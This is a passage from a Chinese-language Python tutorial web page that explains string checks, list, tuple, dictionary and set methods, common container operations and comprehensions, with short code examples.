<li>字符串属于不可变类型，修改的时候其他不是修改原本的字符串，而是返回一个新的字符串。</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = (<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;ddd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_&#x27;</span>.join(list1)) <span class="comment"># 结果：aa_b_cc_ddd</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;...&#x27;</span>.join(t1))  <span class="comment"># 结果：aa...b...cc...ddd</span></span><br></pre></td></tr></table></figure>
<h3 id="7-4-3-判断"><a href="#7-4-3-判断" class="headerlink" title="7.4.3 判断"></a>7.4.3 判断</h3><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>startswith()</td>
<td>字符串序列.startswith(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检查字符串是否是以指定⼦串开头，是则返回 True，否则返回 False。如果设置开始和结束位置下标，则在指定范围内检查。</td>
</tr>
<tr>
<td>endswith()</td>
<td>字符串序列.endswith(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检查字符串是否是以指定⼦串结尾，是则返回 True，否则返回 False。如果设置开始和结束位置下标，则在指定范围内检查。</td>
</tr>
<tr>
<td>isalpha()</td>
<td></td>
<td>如果字符串不为空并且所有字符都是字⺟则返回 True, 否则返回 False。</td>
</tr>
<tr>
<td>isdigit()</td>
<td></td>
<td>如果字符串只包含数字则返回 True 否则返回 False。</td>
</tr>
<tr>
<td>isalnum()</td>
<td></td>
<td>如果字符串不为空并且所有字符都是字⺟或数字则返回 True,否则返回 False。</td>
</tr>
<tr>
<td>isspace()</td>
<td></td>
<td>如果字符串中只包含空⽩，则返回 True，否则返回 False。</td>
</tr>
</tbody></table>
<h1 id="8-列表和元组"><a href="#8-列表和元组" class="headerlink" title="8. 列表和元组"></a>8. 列表和元组</h1><h2 id="8-1-列表"><a href="#8-1-列表" class="headerlink" title="8.1 列表"></a>8.1 列表</h2><h3 id="8-1-1-语法"><a href="#8-1-1-语法" class="headerlink" title="8.1.1 语法"></a>8.1.1 语法</h3><p>列表可以⼀次性存储多个数据，且可以为不同数据类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[数据<span class="number">1</span>, 数据<span class="number">2</span>, 数据<span class="number">3</span>, 数据<span class="number">4.</span>.....]</span><br></pre></td></tr></table></figure>
<h3 id="8-1-2-常用方法"><a href="#8-1-2-常用方法" class="headerlink" title="8.1.2 常用方法"></a>8.1.2 常用方法</h3><h4 id="1-增加"><a href="#1-增加" class="headerlink" title="1. 增加"></a>1. 增加</h4><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>append()</td>
<td>列表序列.append(数据)</td>
<td>列表结尾追加数据。</td>
</tr>
<tr>
<td>extend()</td>
<td>列表序列.extend(数据)</td>
<td>列表结尾追加数据，如果数据是⼀个序列，则将这个序列的数据逐⼀添加到列表。</td>
</tr>
<tr>
<td>insert()</td>
<td>列表序列.insert(位置下标, 数据)</td>
<td>指定位置新增数据。</td>
</tr>
</tbody></table>
<h4 id="2-删除"><a href="#2-删除" class="headerlink" title="2. 删除"></a>2. 删除</h4><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>del</td>
<td>del ⽬标</td>
<td>删除数据，可以是整个列表，也可以是列表中的某个元素</td>
</tr>
<tr>
<td>pop()</td>
<td>列表序列.pop(下标)</td>
<td>删除指定下标的数据(默认为最后⼀个)，并返回该数据。</td>
</tr>
<tr>
<td>remove()</td>
<td>列表序列.remove(数据)</td>
<td>移除列表中某个数据的第⼀个匹配项。</td>
</tr>
<tr>
<td>clear()</td>
<td></td>
<td>清空列表</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name_list = [<span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>, <span class="string">&#x27;Rose&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> name_list[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(name_list)  <span class="comment"># 结果：[&#x27;Lily&#x27;, &#x27;Rose&#x27;]</span></span><br><span class="line"><span class="keyword">del</span> name_list</span><br></pre></td></tr></table></figure>
<h4 id="3-修改"><a href="#3-修改" class="headerlink" title="3. 修改"></a>3. 修改</h4><blockquote>
<p>可以通过坐标直接修改</p>
</blockquote>
<table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>reverse()</td>
<td></td>
<td>逆置</td>
</tr>
<tr>
<td>sort()</td>
<td></td>
<td>排序</td>
</tr>
</tbody></table>
<h4 id="4-查找"><a href="#4-查找" class="headerlink" title="4. 查找"></a>4. 查找</h4><p>  既可以通过下标查找，也可以通过函数查找。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>index()</td>
<td>列表序列.index(数据, 开始位置下标, 结束位置下标)</td>
<td>返回指定数据所在位置的下标。</td>
</tr>
<tr>
<td>count()</td>
<td>list1.count(data)</td>
<td>统计指定数据在当前列表中出现的次数。</td>
</tr>
<tr>
<td>len()</td>
<td></td>
<td>访问列表⻓度，即列表中数据的个数。</td>
</tr>
<tr>
<td>in</td>
<td></td>
<td>判断指定数据在某个列表序列，如果在返回True，否则返回False。</td>
</tr>
<tr>
<td>not in</td>
<td></td>
<td>判断指定数据不在某个列表序列，如果不在返回True，否则返回False。</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name_list = [<span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>, <span class="string">&#x27;Rose&#x27;</span>]</span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您要搜索的名字：&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的名字是<span class="subst">&#123;name&#125;</span>, 名字已经存在&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的名字是<span class="subst">&#123;name&#125;</span>, 名字不存在&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>复制 copy()</li>
</ul>
<h2 id="8-2-元组"><a href="#8-2-元组" class="headerlink" title="8.2 元组"></a>8.2 元组</h2><p>元组与列表十分相似，可以一次存储多个不同类型的数据，但**元组中的数据不可修改.**。</p>
<p><strong>如果元组里面有列表，列表里的数据是可以修改的。</strong></p>
<h3 id="8-2-1-语法"><a href="#8-2-1-语法" class="headerlink" title="8.2.1 语法"></a>8.2.1 语法</h3><p>使⽤⼩括号，且逗号隔开各个数据，数据可以是不同的数据类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 多个数据元组</span></span><br><span class="line">t1 = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单个数据元组</span></span><br><span class="line">t2 = (<span class="number">10</span>,)</span><br></pre></td></tr></table></figure>

<p>注意：如果定义的元组只有⼀个数据，那么这个数据后⾯也好添加逗号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t2 = (<span class="number">10</span>,)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t2)) <span class="comment"># tuple</span></span><br><span class="line"></span><br><span class="line">t3 = (<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t3)) <span class="comment"># int</span></span><br><span class="line"></span><br><span class="line">t4 = (<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t4)) <span class="comment"># str</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-2-常见方法"><a href="#8-2-2-常见方法" class="headerlink" title="8.2.2 常见方法"></a>8.2.2 常见方法</h3><blockquote>
<p>元组可以用下标查找数据</p>
</blockquote>
<table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>index()</td>
<td></td>
<td>查找某个数据，如果数据存在返回对应的下标，否则报错，语法和列表、字符串的 index ⽅法相同。</td>
</tr>
<tr>
<td>count()</td>
<td></td>
<td>统计某个数据在当前元组出现的次数。</td>
</tr>
<tr>
<td>len()</td>
<td></td>
<td>统计元组中数据的个数。</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple1 = (<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">tuple1[<span class="number">0</span>] = <span class="string">&#x27;aaa&#x27;</span>  <span class="comment"># 报错，不能直接修改元组内的数据</span></span><br><span class="line"></span><br><span class="line">tuple2 = (<span class="number">10</span>, <span class="number">20</span>, [<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>], <span class="number">50</span>, <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(tuple2[<span class="number">2</span>])  <span class="comment"># 访问到列表，结果：[&#x27;aa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;]</span></span><br><span class="line">tuple2[<span class="number">2</span>][<span class="number">0</span>] = <span class="string">&#x27;aaaaa&#x27;</span>  <span class="comment"># 可以修改元组里的列表里的数据</span></span><br><span class="line"><span class="built_in">print</span>(tuple2)  <span class="comment"># 结果：(10, 20, [&#x27;aaaaa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;], 50, 30)</span></span><br></pre></td></tr></table></figure>

<h1 id="9-字典"><a href="#9-字典" class="headerlink" title="9. 字典"></a>9. 字典</h1><p>字典的数据以键值对形式存储，数据无序，所以字典不⽀持下标。</p>
<h2 id="9-2-语法"><a href="#9-2-语法" class="headerlink" title="9.2 语法"></a>9.2 语法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据初始化字典</span></span><br><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空字典</span></span><br><span class="line">dict2 = &#123;&#125;</span><br><span class="line">dict3 = <span class="built_in">dict</span>()</span><br></pre></td></tr></table></figure>

<h2 id="9-3-常见操作"><a href="#9-3-常见操作" class="headerlink" title="9.3 常见操作"></a>9.3 常见操作</h2><ol>
<li>增<br>字典序列[key] = 值<blockquote>
<p>如果key存在则修改这个key对应的值；如果key不存在则新增此键值对。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">dict1[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;Rose&#x27;</span></span><br><span class="line"><span class="comment"># 结果：&#123;&#x27;name&#x27;: &#x27;Rose&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;男&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(dict1)</span><br><span class="line"></span><br><span class="line">dict1[<span class="string">&#x27;id&#x27;</span>] = <span class="number">110</span></span><br><span class="line"><span class="comment"># &#123;&#x27;name&#x27;: &#x27;Rose&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;男&#x27;, &#x27;id&#x27;: 110&#125;</span></span><br><span class="line"><span class="built_in">print</span>(dict1)</span><br></pre></td></tr></table></figure></li>
<li>删</li>
</ol>
<ul>
<li>del() / del：删除字典或删除字典中指定键值对。</li>
<li>clear()：清空字典<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> dict1[<span class="string">&#x27;gender&#x27;</span>]</span><br><span class="line"><span class="comment"># 结果：&#123;&#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;age&#x27;: 20&#125;</span></span><br><span class="line"></span><br><span class="line">dict1.clear()  <span class="comment"># &#123;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>查</li>
</ol>
<ul>
<li>key值查找<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(dict1[<span class="string">&#x27;name&#x27;</span>]) <span class="comment"># Tom</span></span><br><span class="line"><span class="comment"># 存在时返回，不存在时报错</span></span><br></pre></td></tr></table></figure></li>
<li>get(key, 默认值)，不存在时返回默认值</li>
<li>keys()</li>
<li>values()</li>
<li>items()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dict1.items())  </span><br><span class="line"><span class="comment"># dict_items([(&#x27;name&#x27;, &#x27;Tom&#x27;), (&#x27;age&#x27;, 20), (&#x27;gender&#x27;, &#x27;男&#x27;)])</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="9-4-循环遍历"><a href="#9-4-循环遍历" class="headerlink" title="9.4 循环遍历"></a>9.4 循环遍历</h2><ul>
<li>遍历 key<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dict1.keys():</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure></li>
<li>遍历 value<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> dict1.values():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure></li>
<li>遍历元素<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># item</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> dict1.items():</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># k,v</span></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> dict1.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span> = <span class="subst">&#123;value&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="10-集合"><a href="#10-集合" class="headerlink" title="10. 集合"></a>10. 集合</h1><h2 id="10-1-语法"><a href="#10-1-语法" class="headerlink" title="10.1 语法"></a>10.1 语法</h2><p>创建集合使⽤ {} 或 set() ， 但是如果要<strong>创建空集合只能使⽤ set()</strong> ，因为 {} ⽤来创建空字典。<br><strong>set 去重原理： 先__hash__，再__eq__</strong></p>
<ul>
<li>特点<ul>
<li>数据不重复</li>
<li>数据无序，不支持下标<h2 id="10-2-常见方法"><a href="#10-2-常见方法" class="headerlink" title="10.2 常见方法"></a>10.2 常见方法</h2><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>add()</td>
<td></td>
<td>增加元素，如果已存在于集合中，不进行任何操作</td>
</tr>
<tr>
<td>update</td>
<td></td>
<td>追加数据，必须是序列</td>
</tr>
<tr>
<td>remove()</td>
<td></td>
<td>删除集合中的指定数据，如果<strong>数据不存在则报错</strong>。</td>
</tr>
<tr>
<td>discard()</td>
<td></td>
<td>删除集合中的指定数据，如果<strong>数据不存在也不会报错</strong>。</td>
</tr>
<tr>
<td>pop()</td>
<td></td>
<td>随机删除集合中的某个数据，并返回这个数据。</td>
</tr>
<tr>
<td>in</td>
<td></td>
<td>判断数据在集合序列</td>
</tr>
<tr>
<td>not in</td>
<td></td>
<td>判断数据不在集合序列</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = &#123;<span class="number">10</span>, <span class="number">20</span>&#125;</span><br><span class="line">s1.add(<span class="number">100</span>)</span><br><span class="line">s1.add(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)  <span class="comment"># &#123;100, 10, 20&#125;</span></span><br><span class="line"></span><br><span class="line">s1 = &#123;<span class="number">10</span>, <span class="number">20</span>&#125;</span><br><span class="line"><span class="comment"># s1.update(100) # 报错</span></span><br><span class="line">s1.update([<span class="number">100</span>, <span class="number">200</span>])</span><br><span class="line">s1.update(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)  <span class="comment"># &#123; &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, 200, 100 , 10, 20 &#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="11-容器类型公有方法"><a href="#11-容器类型公有方法" class="headerlink" title="11. 容器类型公有方法"></a>11. 容器类型公有方法</h1><h2 id="11-1-运算符"><a href="#11-1-运算符" class="headerlink" title="11.1 运算符"></a>11.1 运算符</h2><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>⽀持的容器类型</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>合并</td>
<td>字符串、列表、元组</td>
</tr>
<tr>
<td>*</td>
<td>复制</td>
<td>字符串、列表、元组</td>
</tr>
<tr>
<td>in</td>
<td>元素是否存在</td>
<td>字符串、列表、元组、字典</td>
</tr>
<tr>
<td>not in</td>
<td>元素是否不存在</td>
<td>字符串、列表、元组、字典</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">10</span>)  <span class="comment"># ----------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 列表</span></span><br><span class="line">list1 = [<span class="string">&#x27;hello&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1 * <span class="number">4</span>)  <span class="comment"># [&#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 元组</span></span><br><span class="line">t1 = (<span class="string">&#x27;world&#x27;</span>,)</span><br><span class="line"><span class="built_in">print</span>(t1 * <span class="number">4</span>)  <span class="comment"># (&#x27;world&#x27;, &#x27;world&#x27;, &#x27;world&#x27;, &#x27;world&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="11-2-方法"><a href="#11-2-方法" class="headerlink" title="11.2 方法"></a>11.2 方法</h2><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>len()</td>
<td>计算容器中元素个数</td>
</tr>
<tr>
<td>del 或 del()</td>
<td>删除</td>
</tr>
<tr>
<td>max()</td>
<td>返回容器中元素最⼤值</td>
</tr>
<tr>
<td>min()</td>
<td>返回容器中元素最⼩值</td>
</tr>
<tr>
<td>range(start,end, step)</td>
<td>⽣成从start到end的数字，步⻓为 step，供for循环使⽤</td>
</tr>
<tr>
<td>enumerate()</td>
<td>⽤于将⼀个可遍历的数据对象(如列表、元组或字符串)组合为⼀个索引序列，同时列出数据和数据下标，⼀般⽤在 for 循环当中。</td>
</tr>
</tbody></table>
<p>enumerate(可遍历对象, start=0)</p>
<blockquote>
<p>start参数⽤来设置遍历数据的下标的起始值，默认为0。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># (0, &#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># (1, &#x27;b&#x27;)</span></span><br><span class="line"><span class="comment">#   ... </span></span><br><span class="line"><span class="comment"># (4m &#x27;e&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1, start=<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;下标是<span class="subst">&#123;index&#125;</span>, 对应的字符是<span class="subst">&#123;char&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="comment"># start = 1，下标从1开始，而不是0</span></span><br></pre></td></tr></table></figure>

<h2 id="11-3-容器类型转换"><a href="#11-3-容器类型转换" class="headerlink" title="11.3 容器类型转换"></a>11.3 容器类型转换</h2><p>python 常见的几种容器：str, list, tuple, dict, set</p>
<ul>
<li>tuple()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>]</span><br><span class="line">s1 = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>&#125;  <span class="comment"># set</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(list1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(s1))</span><br></pre></td></tr></table></figure></li>
<li>list()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t1 = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">s1 = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(t1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(s1))</span><br></pre></td></tr></table></figure></li>
<li>set()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>]</span><br><span class="line">t1 = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(list1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(t1))</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="12-推导式"><a href="#12-推导式" class="headerlink" title="12. 推导式"></a>12. 推导式</h1><h2 id="12-1-列表推导式"><a href="#12-1-列表推导式" class="headerlink" title="12.1 列表推导式"></a>12.1 列表推导式</h2><p>⽤⼀个表达式创建⼀个有规律的列表或控制⼀个有规律列表。</p>
<ul>
<li>简单的列表推导式<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)] </span><br><span class="line"><span class="built_in">print</span>(list1)  <span class="comment"># 创建⼀个0-10的列表。</span></span><br><span class="line"></span><br><span class="line">list2 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)]  <span class="comment"># 创建一个 0-10 的偶数列表</span></span><br></pre></td></tr></table></figure></li>
<li>带if的列表推导式<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]  <span class="comment"># 创建一个 0-10 的偶数列表</span></span><br></pre></td></tr></table></figure></li>
<li> 多个for循环实现列表推导式<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [(i, j) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"><span class="comment"># [(1, 0), (1, 1), (1, 2), (2, 0), (2, 1), (2, 2)]</span></span><br></pre></td></tr></table></figure>
<h2 id="12-2-字典推导式"><a href="#12-2-字典推导式" class="headerlink" title="12.2 字典推导式"></a>12.2 字典推导式</h2>字典推导式作⽤：快速合并列表为字典或提取字典中⽬标数据。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 创建⼀个字典：字典key是1-5数字，value是这个数字的2次⽅。</span></span><br><span class="line">dict1 = &#123;i: i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)&#125;</span><br><span class="line"><span class="built_in">print</span>(dict1) <span class="comment"># &#123;1: 1, 2: 4, 3: 9, 4: 16&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 将两个列表合并为⼀个字典</span></span><br><span class="line">list1 = [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;gender&#x27;</span>]</span><br><span class="line">list2 = [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;man&#x27;</span>]</span><br><span class="line">dict1 = &#123;list1[i]: list2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list1))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 提取字典中⽬标数据</span></span><br><span class="line">counts = &#123;<span class="string">&#x27;MBP&#x27;</span>: <span class="number">268</span>, <span class="string">&#x27;HP&#x27;</span>: <span class="number">125</span>, <span class="string">&#x27;DELL&#x27;</span>: <span class="number">201</span>, <span class="string">&#x27;Lenovo&#x27;</span>: <span class="number">199</span>, <span class="string">&#x27;acer&#x27;</span>: <span class="number">99</span>&#125;</span><br><span class="line">count1 = &#123;key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> counts.items() <span class="keyword">if</span> value &gt;= <span class="number">200</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(count1) <span class="comment"># &#123;&#x27;MBP&#x27;: 268, &#x27;DELL&#x27;: 201&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="12-3-集合推导式"><a href="#12-3-集合推导式" class="headerlink" title="12.3 集合推导式"></a>12.3 集合推导式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">set1 = &#123;i ** <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> list1&#125;</span><br><span class="line"><span class="built_in">print</span>(set1) <span class="comment"># &#123;1, 4&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="13-函数"><a href="#13-函数" class="headerlink" title="13. 函数"></a>13. 函数</h1><h2 id="13-1-语法"><a href="#13-1-语法" class="headerlink" title="13.1 语法"></a>13.1 语法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名(<span class="params">参数</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; 说明⽂档的位置 &quot;&quot;&quot;</span></span><br><span class="line">    code</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<ul>
<li>查看函数说明文档<ul>
